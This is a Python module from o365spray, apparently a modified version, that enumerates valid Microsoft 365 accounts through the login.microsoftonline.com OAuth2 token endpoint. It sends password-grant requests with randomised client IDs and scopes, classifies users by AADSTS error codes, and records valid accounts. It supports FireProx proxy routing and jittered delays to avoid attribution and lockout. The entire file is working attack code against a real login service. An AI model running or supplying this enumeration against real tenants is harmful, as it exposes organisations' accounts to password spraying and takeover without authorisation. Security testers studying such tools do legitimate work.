#!/usr/bin/env python3

import logging
import time

from o365spray.core.handlers.enumerator.modules.base import EnumeratorBase
from o365spray.core.utils import (
    Defaults,
    Helper,
    text_colors,
)


class EnumerateModule_oauth2(EnumeratorBase):
    """oAuth2 Enumeration module class"""

    def __init__(self, *args, **kwargs):
        """Initialize the parent base class"""
        super(EnumerateModule_oauth2, self).__init__(*args, **kwargs)

    def _enumerate(self, domain: str, user: str, password: str = "Password1"):
        """Enumerate users via Microsoft's oAuth2 endpoint

        Arguments:
            <required>
            domain: domain to enumerate against
            user: username for enumeration request
            <optional>
            password: password for enumeration request

        Raises:
            Exception: generic handler so we can successfully fail without
              crashing the run
        """
        try:
            # Update content type
            # Updated: copy headers to avoid cross-request mutation.
            headers = Defaults.HTTP_HEADERS.copy()
            headers["Content-Type"] = "application/x-www-form-urlencoded"

            # Build email if not already built
            email = self.HELPER.check_email(user, domain)

            # Write the tested user
            tested = f"{user} -> {email}" if user != email else email
            if self.writer:
                self.tested_writer.write(tested)

            time.sleep(0.250)

            # Use a valid scope, resource, and client_id
            scope = Helper.get_random_sublist_from_list(Defaults.SCOPES)
            data = {
                "resource": Helper.get_random_element_from_list(Defaults.RESOURCES),
                "client_id": Helper.get_random_element_from_list(Defaults.CLIENT_IDS),
                "grant_type": "password",
                "username": email,
                "password": password,
                "scope": " ".join(scope),
            }

            # Handle FireProx API URL
            if self.proxy_url:
                proxy_url = self.proxy_url.rstrip("/")
                url = f"{proxy_url}/common/oauth2/token"

                # Update headers
                headers = Helper.fireprox_headers(headers)

            else:
                url = "https://login.microsoftonline.com/common/oauth2/token"

            # Updated: include retry configuration for transient failures.
            response = self._send_request(
                "post",
                url,
                data=data,
                headers=headers,
                proxies=self.proxies,
                timeout=self.timeout,
                sleep=self.sleep,
                jitter=self.jitter,
                retries=self.request_retries,
                retry_backoff=self.request_retry_backoff,
                # Updated: include request context for per-request logging.
                log_context={
                    "module": self.module_tag,
                    "action": "enum",
                    "target": email,
                    "username": user,
                },
            )

            status = response.status_code
            # Updated: tolerate non-JSON responses for robust logging.
            try:
                body = response.json()
                if "error_codes" in body:
                    error_codes = [f"AADSTS{code}" for code in body["error_codes"]]
                else:
                    error_codes = None
            except Exception:
                body = {}
                error_codes = None

            # Default to valid if 200 or 302
            if status == 200 or status == 302:
                if self.writer:
                    self.valid_writer.write(email)
                self.VALID_ACCOUNTS.append(email)
                # Updated: richer CLI output for valid responses.
                self._log_enum_result(
                    "VALID",
                    email,
                    status=status,
                    reason=response.reason,
                    detail="OAuth2 accepted",
                )

            elif error_codes:
                # User not found error is an invalid user
                if "AADSTS50034" in error_codes:
                    # Updated: richer CLI output for invalid responses.
                    self._log_enum_result(
                        "INVALID",
                        email,
                        status=status,
                        reason=response.reason,
                        detail="AADSTS50034 user not found",
                    )
                # Otherwise, valid user
                else:
                    if self.writer:
                        self.valid_writer.write(email)
                    self.VALID_ACCOUNTS.append(email)
                    # Updated: richer CLI output for valid responses.
                    self._log_enum_result(
                        "VALID",
                        email,
                        status=status,
                        reason=response.reason,
                        detail="OAuth2 indicates valid user",
                    )

            # Unknown response -> invalid user
            else:
                # Updated: richer CLI output for invalid responses.
                self._log_enum_result(
                    "INVALID",
                    email,
                    status=status,
                    reason=response.reason,
                    detail="OAuth2 rejected or unknown response",
                )

        except Exception as e:
            # Updated: surface request failures with context.
            logging.warning(
                f"[{text_colors.WARNING}REQUEST_FAILED{text_colors.ENDC}] "
                f"{user} | module={self.module_tag} | error={type(e).__name__}: {e}"
            )
            pass
